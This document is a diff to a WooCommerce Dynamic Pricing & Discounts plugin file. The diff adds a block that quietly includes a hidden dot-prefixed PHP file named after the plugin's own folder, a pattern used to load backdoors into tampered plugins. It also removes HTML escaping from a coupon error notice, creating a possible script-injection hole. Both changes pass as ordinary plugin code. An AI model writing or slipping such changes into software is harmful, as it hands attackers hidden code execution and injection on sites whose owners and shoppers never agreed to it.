@@ -12,6 +12,10 @@ if (!defined('ABSPATH')) {
  * @package WooCommerce Dynamic Pricing & Discounts
  * @author RightPress
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class RP_WCDPD_WC_Cart
 {
 
@@ -53,7 +57,7 @@ class RP_WCDPD_WC_Cart
                 WC()->cart->remove_coupon($applied_coupon);
 
                 // Add notice
-                wc_add_notice(sprintf(esc_html__('Sorry, coupon "%s" is not valid when other discounts are applied to the cart.', 'rp_wcdpd'), $applied_coupon), 'error');
+                wc_add_notice(sprintf(__('Sorry, coupon "%s" is not valid when other discounts are applied to the cart.', 'rp_wcdpd'), $applied_coupon), 'error');
             }
         }
     }
